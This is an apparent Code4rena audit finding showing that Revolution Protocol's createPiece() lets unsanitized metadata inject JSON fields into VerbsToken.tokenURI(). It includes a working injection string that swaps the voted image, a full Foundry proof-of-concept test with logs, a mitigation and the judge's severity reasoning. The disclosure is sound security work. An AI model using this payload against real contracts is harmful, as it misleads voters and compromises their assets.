[H-03]VerbsToken.tokenURI()is vulnerable to JSON injection attacks
Submitted byKingNFT, also found byZanyBonzyandArmedGoose
https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L209
https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L193
CultureIndex.createPiece()function doesn’t sanitize malicious charcacters inmetadata.imageandmetadata.animationUrl,  which would causeVerbsToken.tokenURI()suffering various JSON injection attack vectors.
If the front end APP doesn’t process the JSON string properly, such as usingeval()to parse token URI, then any malicious code can be executed in the front end. Obviously, funds in users’ connected wallet, such as Metamask, might be stolen in this case.Even while the front end processes securely, such as using the standard builtinJSON.parse()to read URI. Adversary can still exploit this vulnerability to replace art piece image/animation with arbitrary other ones after voting stage completed.
That is the final metadata used by the NFT (VerbsToken) is not the art piece users vote. This attack could be benefit to attackers, such as creating NFTs containing same art piece data with existing high price NFTs. And this attack could also make the project sufferring legal risks, such as creating NFTs with violence or pornography images.
More reference:https://www.comparitech.com/net-admin/json-injection-guide/
Proof of Concept
As shown ofcreatePiece()function, there is no check ifmetadata.imageandmetadata.animationUrlcontain malicious charcacters, such as",:and,.
File:src\CultureIndex.sol209:functioncreatePiece(210:ArtPieceMetadatacalldatametadata,211:CreatorBps[]calldatacreatorArray212:     )publicreturns(uint256) {213:uint256creatorArrayLength=validateCreatorsArray(creatorArray);214:215:// Validate the media type and associated data216:validateMediaType(metadata);217:218:uint256pieceId=_currentPieceId++;219:220:/// @dev Insert the new piece into the max heap221:maxHeap.insert(pieceId,0);222:223:ArtPiecestoragenewPiece=pieces[pieceId];224:225:newPiece.pieceId=pieceId;226:newPiece.totalVotesSupply=_calculateVoteWeight(227:erc20VotingToken.totalSupply(),228:erc721VotingToken.totalSupply()229:         );230:newPiece.totalERC20Supply=erc20VotingToken.totalSupply();231:newPiece.metadata=metadata;232:newPiece.sponsor=msg.sender;233:newPiece.creationBlock=block.number;234:newPiece.quorumVotes= (quorumVotesBPS*newPiece.totalVotesSupply) /10_000;235:236:for(uinti;i<creatorArrayLength;i++) {237:newPiece.creators.push(creatorArray[i]);238:         }239:240:emitPieceCreated(pieceId,msg.sender,metadata,newPiece.quorumVotes,newPiece.totalVotesSupply);241:242:// Emit an event for each creator243:for(uinti;i<creatorArrayLength;i++) {244:emitPieceCreatorAdded(pieceId,creatorArray[i].creator,msg.sender,creatorArray[i].bps);245:         }246:247:returnnewPiece.pieceId;248:     }
Adverary can exploit this to makeVerbsToken.tokenURI()to return various malicious JSON objects to front end APP.
File:src\Descriptor.sol097:functionconstructTokenURI(TokenURIParamsmemoryparams)publicpurereturns(stringmemory) {098:stringmemoryjson=string(099:abi.encodePacked(100:'{"name":"',101:params.name,102:'", "description":"',103:params.description,104:'", "image": "',105:params.image,106:'", "animation_url": "',107:params.animation_url,108:'"}'109:             )110:         );111:returnstring(abi.encodePacked("data:application/json;base64,",Base64.encode(bytes(json))));112:     }
For example, if attacker submit the following metadata:
ICultureIndex.ArtPieceMetadata({name:'Mona Lisa',description:'A renowned painting by Leonardo da Vinci',mediaType:ICultureIndex.MediaType.IMAGE,image:'ipfs://realMonaLisa',text:'',animationUrl:'", "image": "ipfs://fakeMonaLisa'// malicious string injected});
During voting stage, front end getsimagefield byCultureIndex.pieces[pieceId].metadata.image, which isipfs://realMonaLisa. But, after voting complete, art piece is minted toVerbsTokenNFT. Now, front end would queryVerbsToken.tokenURI(tokenId)to get base64 encoded metadata, which would be:
data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=
In the front end, we useJSON.parse()to parse the above data, we getimageasipfs://fakeMonaLisa.Image link:https://gist.github.com/assets/68863517/d769d7ac-db02-4e3b-94d2-dfaf3752b763
Below is the full coded PoC:
// SPDX-License-Identifier: MITpragmasolidity0.8.22;import{Test}from"forge-std/Test.sol";import{console2}from"forge-std/console2.sol";import{RevolutionBuilderTest}from"./RevolutionBuilder.t.sol";import{ICultureIndex}from"../src/interfaces/ICultureIndex.sol";contractJsonInjectionAttackTestisRevolutionBuilderTest{stringpublictokenNamePrefix="Vrb";stringpublictokenName="Vrbs";stringpublictokenSymbol="VRBS";functionsetUp()publicoverride{super.setUp();super.setMockParams();super.setERC721TokenParams(tokenName,tokenSymbol,"https://example.com/token/",tokenNamePrefix);super.setCultureIndexParams("Vrbs","Our community Vrbs. Must be 32x32.",10,500,0);super.deployMock();}functiontestImageReplacementAttack()public{ICultureIndex.CreatorBps[]memorycreators=_createArtPieceCreators();ICultureIndex.ArtPieceMetadatamemorymetadata=ICultureIndex.ArtPieceMetadata({name:'Mona Lisa',description:'A renowned painting by Leonardo da Vinci',mediaType:ICultureIndex.MediaType.IMAGE,image:'ipfs://realMonaLisa',text:'',animationUrl:'", "image": "ipfs://fakeMonaLisa'// malicious string injected});uint256pieceId=cultureIndex.createPiece(metadata,creators);vm.startPrank(address(erc20TokenEmitter));erc20Token.mint(address(this),10_000e18);vm.stopPrank();vm.roll(block.number+1);// ensure vote snapshot is takencultureIndex.vote(pieceId);// 1. the image used during voting stage is 'ipfs://realMonaLisa'ICultureIndex.ArtPiecememorytopPiece=cultureIndex.getTopVotedPiece();assertEq(pieceId,topPiece.pieceId);assertEq(keccak256("ipfs://realMonaLisa"),keccak256(bytes(topPiece.metadata.image)));// 2. after being minted to VerbsToken, the image becomes to 'ipfs://fakeMonaLisa'vm.startPrank(address(auction));uint256tokenId=erc721Token.mint();vm.stopPrank();assertEq(pieceId,tokenId);stringmemoryencodedURI=erc721Token.tokenURI(tokenId);console2.log(encodedURI);stringmemoryprefix=_substring(encodedURI,0,29);assertEq(keccak256('data:application/json;base64,'),keccak256(bytes(prefix)));stringmemoryactualBase64Encoded=_substring(encodedURI,29,bytes(encodedURI).length);stringmemoryexpectedBase64Encoded='eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=';assertEq(keccak256(bytes(expectedBase64Encoded)),keccak256(bytes(actualBase64Encoded)));}function_createArtPieceCreators()internalpurereturns(ICultureIndex.CreatorBps[]memory) {ICultureIndex.CreatorBps[]memorycreators=newICultureIndex.CreatorBps[](1);creators[0] =ICultureIndex.CreatorBps({creator:address(0xc),bps:10_000});returncreators;}function_substring(stringmemorystr,uint256startIndex,uint256endIndex)internalpurereturns(stringmemory){bytesmemorystrBytes=bytes(str);bytesmemoryresult=newbytes(endIndex-startIndex);for(uint256i=startIndex;i<endIndex;i++) {result[i-startIndex] =strBytes[i];}returnstring(result);}}
And, test logs:
2023-12-revolutionprotocol\packages\revolution>forgetest--match-contractJsonInjectionAttackTest-vv[⠑]Compiling...Nofileschanged,compilationskippedRunning1testfortest/JsonInjectionAttack.t.sol:JsonInjectionAttackTest[PASS]testImageReplacementAttack() (gas:1437440)Logs:data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.30msRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1totaltests)
Recommended Mitigation Steps
Sanitize input data according:https://github.com/OWASP/json-sanitizer
rocketman-21 (Revolution) confirmed
0xTheC0der (Judge) commented:
Looks like aMediumat the first glance, but after some thoughtHighseverity seems appropriate due to assets being compromised in a pretty straight-forward way.The front-end part of the present issue is definitely QA but is part of a more severe correctly identified root cause, see point 4.The purpose of using IPFS isimmutability. Thus, the art piece cannot be simply changed on the server. If users vote on an NFT where the underlying art is hosted on a normal webserver, it’s user error.I agree that the provided example findings are QA due to lack of impact on contract/protocol level.The critical part of this attack is that the art piece (IPFS link) that is voted on will differ from the art piece (IPFS link) in the minted VerbsToken which makes this an issue on protocol level where assets are compromised and users will be misled as a result.On the one hand, users have to be careful and review their actions responsibly, but on the other hand it’s any protocol’s duty to protect users to a certain degree (example: slippage control).Here, multiple users are put at risk because of one malicious user.Furthermore, due to the voting mechanism and later minting, users are exposed to a risk that is not as clear to see as if they could see the final NFT from the beginning.I have to draw the line somewhere and here it becomes evident that the protocol’s duty to protect it’s users outweighs the required user scrutiny.
Note: See full discussionhere.